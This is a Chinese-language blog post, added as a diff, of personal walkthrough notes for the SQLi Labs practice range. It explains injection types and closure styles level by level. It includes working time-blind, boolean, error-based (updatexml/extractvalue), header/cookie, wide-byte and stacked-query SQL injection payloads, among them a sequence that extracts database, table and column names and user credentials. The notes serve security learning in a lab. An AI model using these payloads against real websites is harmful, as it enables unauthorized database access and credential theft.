@@ -1,0 +1,228 @@
+﻿---
+title: 'SQLi Labs 靶场笔记'
+date: '2026-01-19'
+summary: '按关卡记录 SQLi Labs 的注入类型、闭合方式与布尔盲注、时间盲注等利用方法。'
+authors:
+  - 'default'
+layout: PostLayout
+---
+
+# sqli_labs个人通关笔记1.14
+
+说明：同样采用灵境一键部署靶场
+
+#### 参考链接：
+
+#### [sqli-labs通关详解 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/440191.html)
+
+[详细sqli-labs（1-65）通关讲解-CSDN博客](https://blog.csdn.net/dreamthe/article/details/123795302)
+
+[SQLI labs 靶场精简学习记录 | 国光](https://www.sqlsec.com/2020/05/sqlilabs.html#sqlmap)
+
+less-1 字符型 id='$id'
+
+less-2 数字型 id=$id，区别就是需要引号闭合
+
+判断字符型还是数字型的方法：[如何判断是字符型注入还是数字型注入\_怎么判断是字符型注入还是数字型注入-CSDN博客](https://blog.csdn.net/chenzzhenguo/article/details/108842399)
+
+less-3 字符型 id=('$id')
+
+**注意：\*\***--+是截断后面的内容，还有--qwe\***\*注释掉后续可能造成语法错误的部分**
+
+less-4 字符型 id=('’$id'‘)
+
+---
+
+less-5 字符型 无回显 用联合注入就没有用，因为联合注入是需要页面有回显位。如果数据 不显示只有对错页面显示我们可以选择布尔盲注。布尔盲注主要用到length(),ascii() ,substr()这三个函数，首先通过length()函数确定长度再通过另外两个确定具体字符是什么。布尔盲注相对于联合注入来说需要花费大量时间。
+
+**注意：\*\***为什么用`id=-1`?\*\*→ 使原查询无结果，仅显示 UNION 数据
+
+less-6，7，8都一样，用布尔盲注，只不过闭合方式不一样
+
+---
+
+less-9 发现我们不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用，布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。
+less-10也是，只是换成双引号
+
+```
+?id=1' and if(1=1,sleep(5),1)--+
+判断参数构造。
+?id=1'and if(length((select database()))>9,sleep(5),1)--+
+判断数据库名长度
+
+?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+逐一判断数据库字符
+?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
+判断所有表名长度
+
+?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
+逐一判断表名
+?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
+判断所有字段名的长度
+
+?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
+逐一判断字段名。
+?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
+判断字段内容长度
+
+?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
+逐一检测内容。
+```
+
+---
+
+前十关使用的是get请求，参数都体现在url上面，而从十一关开始是post请求，参数是在表单里面。我们可以直接在输入框进行注入就行。并且参数不在是一个还是两个。根据前面的认识我们可以猜测sql语句。大概的形式应该是这样username=参数 and password=参数 ，只是不知道是字符型还是整数型。
+
+**注：POST注入中，注释符要用`#`或`-- a`**这里我们使用--+注释就不行，需要换成#来注释
+
+less-11到14只是闭合方式不一样，采用单双引号＋括号
+
+less-15到16只是需要布尔盲注，同样注意闭合方式
+
+**id=1是成立的，所以可以用and，要求两边都成立**
+
+**username = "1或者123"数据库里没有这个名字是不成立的，所以用or，一边成立即可。**
+
+#### **updatexml报错：**
+
+```
+?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
+```
+
+- MySQL的XML处理函数
+- 语法：`updatexml(XML_document, XPath_string, new_value)`
+- 当XPath格式错误时，MySQL会报错并**显示错误信息**
+
+- **`concat(0x7e,database(),0x7e)`**：
+  - `concat()`：字符串连接函数
+  - `0x7e`：十六进制，代表波浪号 `~`
+  - `database()`：MySQL函数，返回当前数据库名
+  - 组合结果：`~数据库名~`
+  - **关键**：故意构造一个错误的XPath格式（以`~`开头），触发报错
+- **第三个参数 `1`**：要替换的新值（实际不会替换）
+
+#### extractvalue() 报错注入：
+
+同updatexml差不多
+
+```
+?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+
+```
+
+##### 与 updatexml() 的对比
+
+| 特性     | extractvalue() | updatexml() |
+| :------- | :------------- | :---------- |
+| 参数个数 | 2个            | 3个         |
+| 功能     | 提取XML值      | 更新XML值   |
+| 字符限制 | 32字符         | 32字符      |
+| 使用频率 | 较高           | 较高        |
+| 语法     | 更简洁         | 稍复杂      |
+
+#### sleep函数：
+
+时间盲注：当页面没有明显回显（无报错、无数据展示）时，通过时间延迟判断注入是否成功。
+
+```
+布尔型时间盲注：?id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
+```
+
+- 如果页面响应延迟5秒 → 说明SQL执行成功，存在注入
+- 如果页面立即响应 → 说明SQL执行失败，可能不存在注入或语法错误
+
+less-17 这一关在用户名处输入的都没有实际作用，只有输入正确的用户名后，会返回`SUCCESSFULLY UPDATED YOUR PASSWORD`,所以注入点应该在密码处。利用updatxml()函数和extractvalue()函数，记得在user name中输入admin正确的用户名。
+
+less-18
+
+User-Agent:浏览器的身份标识字符串，可以判断是手机端或者是电脑端
+
+发现对于输入的账户名和密码都有进行检查，但是往下看会发现一个插入的sql语句，当我们输入争取的账户名和密码我们的User-Agent字段内容就会出现在页面上。所以可以从这上面下功夫
+
+修改user-agent
+
+less-19
+
+本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧
+
+less-20
+
+本关和 Less-18 异曲同工，只是这里的漏洞点出在了 cookie里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧
+
+**注意：都需要看源代码中哪个是含变量，可能存在注入点**
+
+less-21 22 cookie采用的是base64编码
+
+#### cookie注入：
+
+**cookie**是网站为了辨别用户身份，进行 Session 跟踪而储存在用户本地终端上的数据。想要回到登录页面，我们需要先把 cookie 清除掉。
+
+首先输入正确的账户和密码测试，用bp抓包，抓到之后放行POST再抓GET，此时GET中会有cookie信息
+
+此时就可以在cookie处进行测试注入**,cookie需要用get请求一次才行**
+
+less-23
+
+会发现输入单引号报错，但是注释符不管用。猜测注释符被过滤，看来源码果然被注释了，所以我们可以用单引号闭合，发现成功。之后可以使用联合注入。不过在判断列数时候不能使用order by 去判断需要用?id=-1' union select 1,2,3,4 or '1'='1通过不停加数字判断最后根据页面显示是三列，且显示位是2号。
+
+less-24
+
+#### **二次注入**
+
+简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。
+
+#### **宽字节注入**
+
+是利用**字符编码转换问题**绕过程序转义机制的SQL注入技术。主要影响使用**GBK、GB2312、BIG5**等多字节字符集的应用程序。
+
+```
+正常情况：
+输入：'
+转义后：\'
+SQL：WHERE username='\''  → 安全
+
+宽字节漏洞：
+输入：%bf'
+转义后：%bf\' → 0xbf5c27
+GBK解码：0xbf5c 被识别为一个宽字节字符
+剩下：0x27（单引号） → 注入成功！
+```
+
+**统一字符集**：始终使用UTF-8是最好实践
+
+SQL注入绕过技术:大小写绕过、双写绕过注入、编码绕过注入、内联注释绕过
+
+#### \*\*堆叠注入：
+
+MySQL 的命令行中，每一条语句以 `;` 结尾，这代表语句的结束，如果在注入过程中在 `;` 后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：
+
+```bash
+mysql> select * from users where id = 1;select version();
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
++-------------------------+
+| version()               |
++-------------------------+
+| 5.5.44-0ubuntu0.14.04.1 |
++-------------------------+
+1 row in set (0.00 sec)
+```
+
+与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。
+
+**局限性**
+
+1. 并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。
+2. 在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略
+
+这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等
+
+在SQL注入中，**确定查询返回的列数**是进行`UNION`注入攻击的**必要前提条件**。order by查询
+
+- 看到 `''[输入]'''` 这种格式 → 单引号闭合
+- 看到 `"[输入]"` 相关错误 → 双引号相关
+- 看到括号在错误片段中 → 有括号闭合
